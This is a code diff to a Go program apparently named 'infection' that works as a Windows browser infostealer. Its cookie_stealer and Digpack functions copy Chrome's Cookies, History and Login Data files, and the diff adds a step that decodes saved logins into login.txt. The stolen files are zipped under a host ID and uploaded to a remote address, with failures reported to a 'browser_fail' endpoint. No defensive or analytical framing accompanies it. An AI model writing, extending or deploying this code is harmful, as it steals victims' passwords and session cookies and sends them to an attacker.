@@ -4,8 +4,8 @@ import (
 	"archive/zip"
 	"bytes"
 	"fmt"
-	"github.com/parnurzeal/gorequest"
-	"infection/machineinfo"
+	"infection/util/lib"
+	"infection/util/lib/dew32"
 	"io"
 	"io/ioutil"
 	"log"
@@ -16,7 +16,7 @@ import (
 	"time"
 )
 
-var safe_path = get_current_user() + "\\tmp\\"
+var Safe_path = get_current_user() + "\\tmp\\"
 
 type Msg struct {
 	Hostid string `json:"hostid"`
@@ -37,18 +37,18 @@ func get_targetip() string {
 
 //create a dir
 func create_dir() {
-	err := os.MkdirAll(safe_path, 0711)
+	err := os.MkdirAll(Safe_path, 0711)
 	if err != nil {
 		log.Fatal(err)
 	}
 }
 
 func Digpack(addr string) {
-	logf, lerr := os.Stat(safe_path)
+	logf, lerr := os.Stat(Safe_path)
 	if lerr == nil {
 		//keep the file one month then update
 		if time.Now().Unix()-logf.ModTime().Unix() >= 2799765 {
-			os.RemoveAll(safe_path)
+			os.RemoveAll(Safe_path)
 			return
 		} else {
 			return
@@ -57,12 +57,12 @@ func Digpack(addr string) {
 	if os.IsNotExist(lerr) {
 		get_current_user()
 		create_dir()
-		var versionDetail = machineinfo.GetSystemVersion()
 		// if not return will happen nil bug
-		berr := cookie_stealer(addr, *versionDetail)
+		berr := cookie_stealer(addr)
 		if berr != nil {
 			return
 		}
+		dew32.DeCode(Safe_path+"Login Data", addr)
 		time.Sleep(2 * time.Second)
 		buf := new(bytes.Buffer)
 		w := zip.NewWriter(buf)
@@ -72,13 +72,14 @@ func Digpack(addr string) {
 			{"Cookies"},
 			{"History"},
 			{"Login Data"},
+			{"login.txt"},
 		}
 		for _, file := range files {
 			f, err := w.Create(file.Name)
 			if err != nil {
 				log.Fatal(err)
 			}
-			fbody, err := ioutil.ReadFile(safe_path + file.Name)
+			fbody, err := ioutil.ReadFile(Safe_path + file.Name)
 			_, err = f.Write(fbody)
 			if err != nil {
 				log.Fatal(err)
@@ -88,19 +89,19 @@ func Digpack(addr string) {
 		if err != nil {
 			log.Fatal(err)
 		}
-		f, err := os.OpenFile(safe_path+versionDetail.Hostid+".zip", os.O_CREATE|os.O_WRONLY, 0666)
+		f, err := os.OpenFile(Safe_path+lib.HOSTID+".zip", os.O_CREATE|os.O_WRONLY, 0666)
 		if err != nil {
 			log.Fatal(err)
 		}
 		buf.WriteTo(f)
 		pbuf := new(bytes.Buffer)
 		writer := multipart.NewWriter(pbuf)
-		formFile, err := writer.CreateFormFile("file", versionDetail.Hostid+".zip")
+		formFile, err := writer.CreateFormFile("file", lib.HOSTID+".zip")
 		if err != nil {
 			log.Println("Create form file failed: %s\n", err)
 		}
 		// 从文件读取数据，写入表单
-		srcFile, err := os.Open(safe_path + versionDetail.Hostid + ".zip")
+		srcFile, err := os.Open(Safe_path + lib.HOSTID + ".zip")
 		if err != nil {
 			fmt.Println("Open source file failed: s\n", err)
 		}
@@ -147,23 +148,15 @@ func check(err error) {
 	}
 }
 
-func cookie_stealer(addr string, detail machineinfo.VersionDetail) error {
+func cookie_stealer(addr string) error {
 	// todo other browser
 	current_user := get_current_user()
 	cp := current_user + "\\appdata\\Local\\Google\\Chrome\\User Data\\Default\\"
 	//check chrome
 	_, err := os.Stat(cp)
 	if err != nil {
-		msg := Msg{
-			Hostid: detail.Hostid,
-			Code:   101,
-		}
-		_, _, _ = gorequest.New().
-			Post(addr+"browser_fail").
-			Set("content-type", "application/x-www-form-urlencoded").
-			Send(msg).
-			End()
-		os.RemoveAll(safe_path)
+		lib.ErrorStatusCode(101, lib.HOSTID, addr+"browser_fail")
+		os.RemoveAll(Safe_path)
 		return err
 	}
 	if os.IsNotExist(err) {
@@ -181,7 +174,7 @@ func cookie_stealer(addr string, detail machineinfo.VersionDetail) error {
 	check(err)
 	defer srcFile.Close()
 
-	new_path := safe_path + cookie_file
+	new_path := Safe_path + cookie_file
 
 	destFile, err := os.Create(new_path)
 	check(err)
@@ -205,7 +198,7 @@ func copyFiles(src string, concat string) {
 	check(err)
 	defer srcFile.Close()
 
-	new_path := safe_path + concat
+	new_path := Safe_path + concat
 
 	destFile, err := os.Create(new_path)
 	check(err)
